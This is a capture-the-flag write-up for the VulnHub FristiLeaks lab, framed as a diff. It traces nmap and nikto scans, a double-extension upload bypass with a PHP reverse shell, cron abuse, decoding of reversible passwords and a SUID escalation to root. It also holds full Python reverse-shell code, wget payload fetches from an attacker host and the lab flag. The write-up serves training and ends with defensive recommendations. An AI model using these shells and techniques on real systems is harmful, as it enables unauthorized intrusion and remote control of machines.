@@ -1,0 +1,617 @@
+================================================================================
+Fristi Leaks CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/fristileaks-13,133/
+================================================================================
+
+STYLE: Enumeration/Follow the breadcrumbs
+OBJECTIVE: Get root (uid 0) and read the flag file
+DIFFICULTY: Basic
+TARGET IP: 10.0.2.13
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Network Scan
+nmap -sV -sC -p- 10.0.2.13
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 12:38 -0500
+Nmap scan report for 10.0.2.13
+Host is up (0.00035s latency).
+Not shown: 65381 filtered tcp ports (no-response), 153 filtered tcp ports (host-prohibited)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+| http-methods: 
+|_  Potentially risky methods: TRACE
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 155.92 seconds
+
+# Web vulnerability scan
+nikto -h http://10.0.2.13
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.13
++ Target Hostname:    10.0.2.13
++ Target Port:        80
++ Start Time:         2026-01-28 12:56:43 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
++ /: Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /robots.txt: Entry '/beer/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/sisi/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: Entry '/cola/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
++ /robots.txt: contains 3 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ PHP/5.3.3 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
++ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
++ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
++ PHP/5.3 - PHP 3/4/5 and 7.0 are End of Life products without support.
++ /icons/: Directory indexing found.
++ /images/: Directory indexing found.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 8911 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2026-01-28 12:57:01 (GMT-5) (18 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+================================================================================
+[2] WEB APPLICATION ANALYSIS
+================================================================================
+
+# Initial web enumeration
+curl http://10.0.2.13
+
+# Check robots.txt
+curl http://10.0.2.13/robots.txt
+
+User-agent: *
+Disallow: /cola
+Disallow: /sisi
+Disallow: /beer
+
+# Critical insight: All disallowed entries are beverage names (cola, sisi, beer)
+# "Fristi" is also a beverage brand (Dutch yogurt drink)
+# Testing alternative directory
+
+http://10.0.2.13/fristi/
+
+Result: "Welcome to #fristileaks admin portal"
+
+================================================================================
+[3] CREDENTIAL DISCOVERY
+================================================================================
+
+# Admin portal page source analysis
+view-source:http://10.0.2.13/fristi/
+
+# Discovered base64-encoded data in HTML comments
+# Extract base64 string to file
+echo "iVBORw0KGgoAAAANSUhEUgAAAW0AAAD..." > base64.txt
+
+# Decode base64
+base64 -d base64.txt
+
+# Output appears to be binary (PNG file signature)
+# Save as PNG image
+base64 -d base64.txt > base64.png
+
+# Open image to reveal hidden password
+# Password visible in image: keKkeKKeKKeKkEkkEk
+
+# Username discovery
+# Found in HTML source as description: "eezeepz"
+
+Valid credentials:
+  Username: eezeepz
+  Password: keKkeKKeKKeKkEkkEk
+
+# Login successful
+http://10.0.2.13/fristi/upload.php
+
+================================================================================
+[4] INITIAL ACCESS - FILE UPLOAD EXPLOITATION
+================================================================================
+
+# File upload interface available after authentication
+# Testing upload restrictions
+
+# Prepare PHP reverse shell
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+
+# Edit shell configuration
+nano shell.php
+# Modify IP and port:
+$ip = '10.0.2.6';    # Attacker IP
+$port = 1234;        # Listener port
+
+# Upload attempt with .php extension
+Upload: shell.php
+Result: "Sorry, is not a valid file. Only allowed are: png,jpg,gif"
+
+# Bypass filter using double extension
+Rename: shell.php.png
+
+# Upload successful
+File uploaded to: /fristi/uploads/shell.php.png
+
+# Start netcat listener
+nc -nvlp 1234
+
+# Trigger reverse shell
+curl http://10.0.2.13/fristi/uploads/shell.php.png
+
+# Connection received
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.13] 38562
+sh-4.1$ whoami
+apache
+
+# Current shell limitations
+sh-4.1$ echo $SHELL
+/sbin/nologin
+
+================================================================================
+[5] ENUMERATION - USER DISCOVERY
+================================================================================
+
+# Enumerate system users
+cat /etc/passwd | grep /bin/bash
+
+root:x:0:0:root:/root:/bin/bash
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+eezeepz:x:500:500::/home/eezeepz:/bin/bash
+admin:x:501:501::/home/admin:/bin/bash
+fristigod:x:502:502::/var/fristigod:/bin/bash
+
+# Check home directories
+ls -la /home
+
+total 20
+drwxr-xr-x  5 root      root      4096 Nov 19  2015 .
+dr-xr-xr-x 22 root      root      4096 Nov 19  2015 ..
+drwx------  2 admin     admin     4096 Nov 19  2015 admin
+drwx------  2 eezeepz   eezeepz   4096 Nov 19  2015 eezeepz
+drwx------  2 fristigod fristigod 4096 Nov 19  2015 fristigod
+
+# Navigate to eezeepz home directory
+cd /home/eezeepz
+ls -la
+
+total 12
+drwx------ 2 eezeepz eezeepz 4096 Nov 19 2015 .
+drwxr-xr-x 5 root    root    4096 Nov 19 2015 ..
+-rw-r--r-- 1 eezeepz eezeepz  353 Nov 18 2015 notes.txt
+
+# Read notes.txt
+cat notes.txt
+
+Yo EZ,
+I made it possible for you to do some automated checks, 
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+Don't forget to specify the full path for each binary!
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+- Jerry
+
+# Critical information discovered:
+# - Cron job runs as admin user
+# - Executes commands from /tmp/runthis
+# - Allows /usr/bin/* binaries
+
+# Attempt to switch user (fails without TTY)
+su eezeepz
+standard in must be a tty
+
+================================================================================
+[6] PRIVILEGE ESCALATION - ADMIN USER
+================================================================================
+
+# Prepare Python reverse shell
+# Attacker machine - Create prs.py
+cat > prs.py << 'EOF'
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.0.2.6", 4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
+EOF
+
+# Start HTTP server to serve payload
+python3 -m http.server --bind 10.0.2.6
+Serving HTTP on 10.0.2.6 port 8000 ...
+
+# Target machine - Download payload
+cd /tmp
+wget http://10.0.2.6:8000/prs.py
+
+# Create cron job trigger file
+echo "/usr/bin/python /tmp/prs.py" > /tmp/runthis
+
+# Attacker machine - Start listener
+nc -nvlp 4444
+listening on [any] 4444 ...
+
+# Wait for cron execution (runs every minute)
+# Connection received
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.13] 50004
+bash: no job control in this shell
+
+[admin@localhost ~]$ whoami
+admin
+
+# Enumerate admin home directory
+[admin@localhost ~]$ ls -la
+
+total 652
+drwx------  2 admin     admin       4096 Nov 19  2015 .
+drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
+-rw-r--r--  1 admin     admin         18 Nov 17  2015 .bash_logout
+-rw-r--r--  1 admin     admin        176 Nov 17  2015 .bash_profile
+-rw-r--r--  1 admin     admin        124 Nov 17  2015 .bashrc
+-rwxr-xr-x  1 admin     admin      45224 Nov 18  2015 cat
+-rwxr-xr-x  1 admin     admin      48712 Nov 18  2015 chmod
+-rw-r--r--  1 admin     admin        737 Nov 18  2015 cronjob.py
+-rw-r--r--  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
+-rw-r--r--  1 admin     admin        258 Nov 18  2015 cryptpass.py
+-rwxr-xr-x  1 admin     admin      90544 Nov 18  2015 df
+-rwxr-xr-x  1 admin     admin      24136 Nov 18  2015 echo
+-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 egrep
+-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 grep
+-rwxr-xr-x  1 admin     admin      85304 Nov 18  2015 ps
+-rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
+
+# Read encrypted password files
+[admin@localhost ~]$ cat whoisyourgodnow.txt
+=RFn0AKnlMHMPIzpyuTI0ITG
+
+[admin@localhost ~]$ cat cryptedpass.txt
+mVGZ3O3omkJLmy2pcuTq
+
+# Analyze encryption script
+[admin@localhost ~]$ cat cryptpass.py
+
+#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
+import base64,codecs,sys
+
+def encodeString(str):
+    base64string= base64.b64encode(str)
+    return codecs.encode(base64string[::-1], 'rot13')
+
+cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+
+# Encryption method identified: base64 → reverse → ROT13
+
+================================================================================
+[7] PASSWORD DECRYPTION
+================================================================================
+
+# Attacker machine - Create decryption script
+cat > decrypt.py << 'EOF'
+import base64
+import codecs
+import sys
+
+def decodeString(s):
+    rot13_decoded = codecs.decode(s[::-1], 'rot_13')    # ROT13 decode + reverse
+    base64_decoded = base64.b64decode(rot13_decoded)    # base64 decode (bytes)
+    return base64_decoded.decode()                      # bytes -> str
+
+cryptResult = decodeString(sys.argv[1])
+print(cryptResult)
+EOF
+
+# Decrypt whoisyourgodnow.txt password
+python3 decrypt.py "=RFn0AKnlMHMPIzpyuTI0ITG"
+LetThereBeFristi!
+
+# Decrypt cryptedpass.txt password
+python3 decrypt.py "mVGZ3O3omkJLmy2pcuTq"
+thisisalsopw123
+
+# Passwords obtained:
+# fristigod: LetThereBeFristi!
+# admin:     thisisalsopw123
+
+================================================================================
+[8] PRIVILEGE ESCALATION - FRISTIGOD USER
+================================================================================
+
+# Attempt user switch (requires TTY)
+[admin@localhost ~]$ su fristigod
+standard in must be a tty
+
+# Spawn TTY using Python
+[admin@localhost ~]$ python -c 'import pty; pty.spawn("/bin/bash")'
+[admin@localhost ~]$ su fristigod
+Password: LetThereBeFristi!
+
+bash-4.1$ whoami
+fristigod
+
+# Enumerate fristigod owned files
+bash-4.1$ find / -user fristigod 2>/dev/null
+
+/var/fristigod
+/var/fristigod/.bash_logout
+/var/fristigod/.bash_profile
+/var/fristigod/.bashrc
+/var/fristigod/.secret_admin_stuff
+/var/fristigod/.secret_admin_stuff/doCom
+/var/spool/mail/fristigod
+
+# Check bash history
+bash-4.1$ cat /var/fristigod/.bash_history
+
+ls
+pwd
+ls -lah
+cd .secret_admin_stuff/
+ls
+./doCom
+./doCom test
+sudo ls
+exit
+cd .secret_admin_stuff/
+ls
+./doCom 
+sudo -u fristi ./doCom ls /
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+
+# Critical finding: doCom binary can be executed with sudo
+
+# Navigate to secret directory
+bash-4.1$ cd /var/fristigod/.secret_admin_stuff
+bash-4.1$ ls -l
+
+total 8
+-rwsr-sr-x 1 root root 7529 Nov 25 2015 doCom
+
+# Binary has SUID bit set (owned by root)
+
+# Test doCom functionality
+bash-4.1$ sudo -u fristi ./doCom ls /
+[sudo] password for fristigod: LetThereBeFristi!
+
+bin   dev  home  lib64       media  opt   root  selinux  sys  usr
+boot  etc  lib   lost+found  mnt    proc  sbin  srv      tmp  var
+
+# doCom allows execution of arbitrary commands with elevated privileges
+
+================================================================================
+[9] PRIVILEGE ESCALATION - ROOT ACCESS
+================================================================================
+
+# Strategy: Use doCom to execute Python reverse shell as root
+
+# Attacker machine - Start new listener (different port)
+nc -nvlp 4445
+listening on [any] 4445 ...
+
+# Target machine - Modify Python reverse shell for new port
+# Edit prs.py to use port 4445
+bash-4.1$ cd /var/fristigod/.secret_admin_stuff
+
+# Download or create new reverse shell payload
+bash-4.1$ wget http://10.0.2.6:8000/prs.py
+
+bash-4.1$ ls -l
+total 12
+-rwsr-sr-x 1 root      root      7529 Nov 25  2015 doCom
+-rw-rw-r-- 1 fristigod fristigod  251 Jan 28 15:23 prs.py
+
+# Execute reverse shell through doCom
+bash-4.1$ sudo -u fristi ./doCom /usr/bin/python prs.py
+
+# Attacker machine - Root shell received
+nc -nvlp 4445
+listening on [any] 4445 ...
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.13] 51710
+
+bash-4.1# whoami
+root
+
+bash-4.1# id
+uid=0(root) gid=0(root) groups=0(root),100(users)
+
+================================================================================
+[10] FLAG CAPTURE
+================================================================================
+
+bash-4.1# cd /root
+bash-4.1# ls -la
+
+total 16
+dr-xr-x---  2 root root 4096 Nov 19  2015 .
+dr-xr-xr-x 22 root root 4096 Nov 19  2015 ..
+-rw-r--r--  1 root root   18 May 20  2009 .bash_logout
+-rw-r--r--  1 root root  176 May 20  2009 .bash_profile
+-rw-r--r--  1 root root  176 Sep 22  2004 .bashrc
+-rw-------  1 root root  129 Nov 19  2015 .bash_history
+-rw-r--r--  1 root root  214 Nov 18  2015 fristileaks_secrets.txt
+
+bash-4.1# cat fristileaks_secrets.txt
+
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+
+================================================================================
+[11] FLAGS SUMMARY
+================================================================================
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1  (Location: /root/fristileaks_secrets.txt)
+
+================================================================================
+[12] VULNERABILITIES EXPLOITED
+================================================================================
+
+1. Weak Directory Enumeration Protection
+   - robots.txt provided clues through beverage naming pattern
+   - Hidden admin portal discoverable through pattern recognition
+
+2. Information Disclosure
+   - Base64-encoded password embedded in HTML source code
+   - Username revealed in page source comments
+
+3. Insufficient File Upload Validation
+   - File type filtering based only on extension
+   - Double extension bypass (shell.php.png) allowed code execution
+   - No content-type or magic number validation
+
+4. Insecure Cron Job Implementation
+   - World-writable trigger file (/tmp/runthis)
+   - Executes arbitrary commands with elevated privileges
+   - No input validation or integrity checks
+
+5. Weak Password Storage
+   - Reversible encryption scheme (base64 + ROT13)
+   - Encrypted passwords stored in readable text files
+   - Custom encryption provides no real security
+
+6. SUID Binary Misconfiguration
+   - doCom binary with SUID bit allows arbitrary command execution
+   - No input sanitization or command restrictions
+   - Allows privilege escalation to root
+
+7. Outdated Software Stack
+   - PHP 5.3.3 (End of Life, multiple CVEs)
+   - Apache 2.2.15 (outdated, security vulnerabilities)
+   - CentOS with unpatched components
+
+================================================================================
+[13] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap reconnaissance
+    ↓
+Nikto web vulnerability scan
+    ↓
+robots.txt enumeration (beverage pattern discovery)
+    ↓
+/fristi/ directory discovery
+    ↓
+HTML source analysis (base64 password + username)
+    ↓
+Admin portal authentication (eezeepz:keKkeKKeKKeKkEkkEk)
+    ↓
+File upload exploitation (shell.php.png)
+    ↓
+Initial access as apache user
+    ↓
+File enumeration (notes.txt discovery)
+    ↓
+Cron job abuse (/tmp/runthis)
+    ↓
+User escalation (apache → admin)
+    ↓
+Password file discovery and decryption
+    ↓
+User switch (admin → fristigod)
+    ↓
+SUID binary discovery (doCom)
+    ↓
+Privilege escalation (fristigod → root)
+    ↓
+Complete compromise (flag captured)
+
+================================================================================
+[14] TOOLS USED
+================================================================================
+
+- Nmap 7.98           : Network scanning and service enumeration
+- Nikto 2.5.0         : Web server vulnerability scanner
+- curl                : HTTP requests and file retrieval
+- base64              : Decoding encoded content
+- Python 2.7/3.x      : Reverse shell and decryption scripts
+- Netcat              : Reverse shell listener
+- wget                : File download utility
+- find                : File system enumeration
+
+================================================================================
+[15] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. Web Application Security
+   - Implement proper input validation on all file uploads
+   - Validate file content using magic numbers, not just extensions
+   - Use Content Security Policy (CSP) headers
+   - Remove sensitive information from HTML source code
+   - Implement secure session management
+
+2. Authentication & Authorization
+   - Never embed credentials in source code or comments
+   - Use strong, salted, one-way hashing (bcrypt, Argon2)
+   - Implement account lockout mechanisms
+   - Use multi-factor authentication for administrative access
+   - Regular password rotation policies
+
+3. File System Security
+   - Restrict file permissions using principle of least privilege
+   - Audit and remove unnecessary SUID/SGID binaries
+   - Implement file integrity monitoring
+   - Secure temporary directories with proper permissions
+
+4. Cron Job Security
+   - Use absolute paths in cron scripts
+   - Implement strict file permission controls (600/700)
+   - Validate all inputs to automated scripts
+   - Log all cron job executions
+   - Avoid world-writable trigger files
+
+5. System Hardening
+   - Keep all software up to date with security patches
+   - Remove or disable unnecessary services
+   - Implement intrusion detection/prevention systems
+   - Regular security audits and penetration testing
+   - Follow CIS benchmarks for system configuration
+
+6. Network Security
+   - Implement Web Application Firewall (WAF)
+   - Use HTTPS/TLS for all web traffic
+   - Network segmentation and access control lists
+   - Regular vulnerability assessments
+
+================================================================================
+[16] REFERENCES
+================================================================================
+
+- VulnHub Fristi Leaks: https://www.vulnhub.com/entry/fristileaks-13,133/
+- OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+- OWASP Top 10: https://owasp.org/www-project-top-ten/
+- GTFOBins: https://gtfobins.github.io/
+- CIS Benchmarks: https://www.cisecurity.org/cis-benchmarks
+
+================================================================================
+[17] DISCLAIMER
+================================================================================
+
+This writeup is for educational purposes only. All techniques demonstrated
+should only be used on systems you own or have explicit permission to test.
+Unauthorized access to computer systems is illegal.
+
+================================================================================
